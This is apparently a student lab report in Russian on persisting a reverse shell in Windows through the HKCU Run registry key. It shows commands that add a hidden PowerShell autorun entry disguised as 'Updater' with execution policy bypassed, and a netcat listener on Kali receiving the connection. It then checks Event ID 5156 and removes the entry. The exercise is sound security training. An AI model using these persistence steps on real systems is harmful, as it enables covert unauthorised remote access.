## Задание 1. Закрепление reverse shell через `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`


## 1. Создание пользователя

Для последующих заданий был создан пользователь `student` с паролем `qwerty123`.

```cmd
net user student qwerty123 /add
net user student
```

![Создание пользователя](1WindowsCreateUser.png)

---

## 2. Проверка ключа Run

Для проверки механизма автозапуска была создана тестовая запись в реестре.

```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v TestRun /t REG_SZ /d "cmd.exe /c echo Autorun worked > C:\Temp\autorun.txt" /f
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

После повторного входа в систему был создан файл `C:\Temp\autorun.txt`.

![Проверка ключа Run](2.HKCU.png)

![Проверка autorun.txt](3.png)

---

## 3. Настройка reverse shell

На Windows был создан файл `C:\Temp\reverse.ps1`, который подключается к Kali Linux на порт `4444`.

Для автоматического запуска скрипта была создана запись в реестре:

```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Temp\reverse.ps1" /f
```

---

## 4. Получение подключения на Kali Linux

На Kali Linux был запущен listener:

```bash
nc -lvnp 4444
```

После запуска скрипта было получено обратное подключение.

Через reverse shell были выполнены команды:

```cmd
whoami
ipconfig
```

![Подключение и выполнение команд](KaliIPConfig.png)

---

## 5. Поиск события Event ID 5156

В журнале `Event Viewer → Windows Logs → Security` было найдено событие `5156`, подтверждающее исходящее соединение `powershell.exe` на адрес `192.168.100.10` и порт `4444`.

---

## 6. Удаление закрепления

```cmd
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /f
```

После удаления записи и повторной перезагрузки Windows новое соединение на Kali Linux не устанавливалось.
